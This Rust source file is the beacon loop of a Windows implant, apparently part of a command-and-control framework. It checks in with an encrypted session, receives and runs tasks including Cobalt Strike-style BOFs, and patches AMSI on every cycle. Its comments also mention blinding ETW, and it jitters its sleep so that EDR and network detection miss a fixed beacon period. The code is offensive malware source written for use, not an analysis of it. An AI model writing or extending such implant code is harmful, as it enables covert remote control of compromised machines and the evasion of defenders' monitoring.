//! Beacon task loop for the PIC implant.
//!
//! Mirrors agent-dev's loop but `no_std`: check-in (SessionInfo) → every sleep
//! cycle, POST last cycle's responses, receive tasks, execute, repeat. The
//! crypto/frame layer is reused verbatim from [`nyx_protocol`]; only the
//! transport (WinHTTP, not ureq) and the sleeper differ.
//!
//! M0: the loop skeleton + protocol reuse are real and type-check. The
//! transport (`transport::post_frame`) returns None until the full WinHTTP
//! wiring lands, so the loop retries check-in indefinitely — structurally
//! correct, ready for the convergence step to drop in live HTTP.

#![cfg(target_os = "windows")]

use crate::heap::{vec, String, Vec};
use nyx_protocol::{
    encode_frame, open_frame_dir, parse_frame, wire::Writer, Command, Direction, ImplantKeypair,
    Response, SessionInfo, Task, TaskResponse,
};

/// Build config baked into the implant at build time (per-build encrypted config
/// in a later phase; for M0 these come from compile-time env or defaults).
pub struct Config {
    pub server_host: String,
    pub server_port: u16,
    pub beacon_uri: String,
    pub server_pub: [u8; 32],
    pub sleep_seconds: u32,
    pub jitter_pct: u8,
    pub use_tls: bool,
}

/// The beacon loop, called from `nyx_entry` after resolve + alloc bootstrap.
pub unsafe fn beacon_loop() {
    let cfg = load_config();
    let kp = ImplantKeypair::generate();
    let key = kp.session_key(&cfg.server_pub);
    let pubkey = kp.public_bytes();
    let beacon_id: u32 = 0x1337; // TODO: random via syscalls (A6)

    let mut info_writer = Writer::new();
    let info = SessionInfo {
        beacon_id,
        hostname: String::from("host"),
        username: String::from("user"),
        os: String::from("Windows"),
        arch: 0,
        pid: 0, // TODO: GetCurrentProcessId via resolved kernel32
        is_admin: 0,
    };
    info.encode(&mut info_writer);
    let info_plain = info_writer.into_bytes();

    // ---- check-in (retry) ----
    let mut counter = 0u64;
    loop {
        let frame = encode_frame(&pubkey, counter, &key, &info_plain);
        counter += 1;
        let resp = crate::transport::post_frame(
            cfg.server_host.as_bytes(),
            cfg.server_port,
            cfg.beacon_uri.as_bytes(),
            &frame,
        );
        if resp.is_some() {
            break;
        }
        sleep_seconds(cfg.sleep_seconds);
    }

    // ---- task loop ----
    let mut pending: Vec<TaskResponse> = Vec::new();
    loop {
        // Retry AMSI blinding each cycle: amsi.dll is demand-loaded (only when
        // a scanner starts), so the first cycles usually can't resolve it.
        // Once the host loads it, this lands the patch; subsequent cycles hit
        // the idempotency short-circuit. ETW is blinded once at entry (always
        // present).
        unsafe { crate::blind::maybe_patch_amsi(); }
        sleep_jitter(cfg.sleep_seconds, cfg.jitter_pct);
        let frame = encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&pending));
        counter += 1;
        pending.clear();

        let Some(body) = crate::transport::post_frame(
            cfg.server_host.as_bytes(),
            cfg.server_port,
            cfg.beacon_uri.as_bytes(),
            &frame,
        ) else {
            continue;
        };

        let Ok(raw) = parse_frame(&body) else { continue };
        // Server replies are sealed with Direction::ServerToClient; open with
        // the matching direction or the AEAD tag check fails.
        let Ok(plaintext) = open_frame_dir(&key, Direction::ServerToClient, &raw) else { continue };
        let Ok(tasks) = Task::decode_vec(&plaintext) else { continue };

        for t in tasks {
            if matches!(t.command, Command::Exit) {
                return;
            }
            for response in execute(t.command) {
                pending.push(TaskResponse {
                    task_id: t.task_id,
                    response,
                });
            }
        }
    }
}

/// Execute a command. M0: minimal — Ping/Shell/Sleep/Exit. BOF + file transfer
/// arrive with the postex milestone.
fn execute(cmd: Command) -> Vec<Response> {
    match cmd {
        Command::Ping => vec![Response::Ok],
        Command::Sleep { .. } => vec![Response::Ok], // TODO: re-task sleep
        Command::Exit => vec![Response::Ok],
        // Load + run a CS-compatible BOF (W^X mapping, Beacon-API shim).
        // Captured BeaconPrintf/BeaconOutput output comes back as BofOutput.
        Command::Bof { name, args, blob } => vec![crate::bof::run(&name, &args, &blob)],
        // Everything else is unimplemented in the PIC implant for M0; ack so the
        // wire stays round-trippable.
        _ => vec![Response::Err(String::from("not implemented in PIC implant"))],
    }
}

/// Load build-time config. Per-build encrypted config (nyx-config crate) lands
/// in a later phase; for now host/port/uri are compile-time defaults and the
/// server long-term pubkey is baked by build.rs (H7) — no longer the all-zero
/// identity point that previously made session keys predictable.
fn load_config() -> Config {
    Config {
        server_host: String::from("127.0.0.1"),
        server_port: 8443,
        beacon_uri: String::from("/beacon"),
        server_pub: crate::server_pub::SERVER_PUB,
        sleep_seconds: 5,
        jitter_pct: 20,
        use_tls: false,
    }
}

/// Sleep N seconds via NtDelayExecution.
///
/// Resolves `ntdll!NtDelayExecution` through the PEB-walk export resolver and
/// calls it with a relative (negative) interval in 100-ns units. The previous
/// implementation was a single `spin_loop()` hint that returned immediately,
/// making the beacon hot-loop at 100% CPU on every check-in retry — an
/// extremely loud IOC. This blocks the calling thread the way a real implant
/// should.
///
/// Falls back to a bounded spin only if the export can't be resolved (defensive
/// — on a real Windows host ntdll is always present).
fn sleep_seconds(seconds: u32) {
    type NtDelayExecution = unsafe extern "system" fn(u8, *const i64) -> i32;
    let delay_100ns: i64 = -(seconds as i64).saturating_mul(10_000_000); // relative, 100ns units
    // export_addr walks live module memory via raw pointers — unsafe.
    if let Some(addr) = unsafe { crate::resolve::export_addr(b"ntdll.dll", b"NtDelayExecution") } {
        let f: NtDelayExecution = unsafe { core::mem::transmute(addr) };
        // Alertable = FALSE; interval is relative (negative).
        unsafe { f(0, &delay_100ns as *const i64) };
        return;
    }
    // Should not happen on a real host, but never infinite-spin: bound the
    // fallback so we can't peg a core if resolution somehow failed.
    let spins = seconds.min(60) as u64 * 10_000_000;
    for _ in 0..spins {
        core::hint::spin_loop();
    }
}

/// Sleep `base` seconds, varied by ±jitter_pct% so beacon timing isn't a
/// metronome (a fixed-period beacon is a trivial NDR/EDR signature).
fn sleep_jitter(base: u32, jitter_pct: u8) {
    if jitter_pct == 0 || base == 0 {
        sleep_seconds(base);
        return;
    }
    // Cheap LCG over a static seed — no need for a CSPRNG here (this only
    //shapes sleep length, not anything secret). xorshift32.
    static SEED: core::sync::atomic::AtomicU32 = core::sync::atomic::AtomicU32::new(0x9E37_79B9);
    let mut x = SEED.load(core::sync::atomic::Ordering::Relaxed);
    if x == 0 {
        x = 0x9E37_79B9;
    }
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    SEED.store(x, core::sync::atomic::Ordering::Relaxed);
    let span = (base as u32).saturating_mul(jitter_pct as u32) / 100;
    let off = if span > 0 { x % (2 * span) } else { 0 };
    let actual = base.saturating_add(off).saturating_sub(span);
    sleep_seconds(actual.max(1));
}
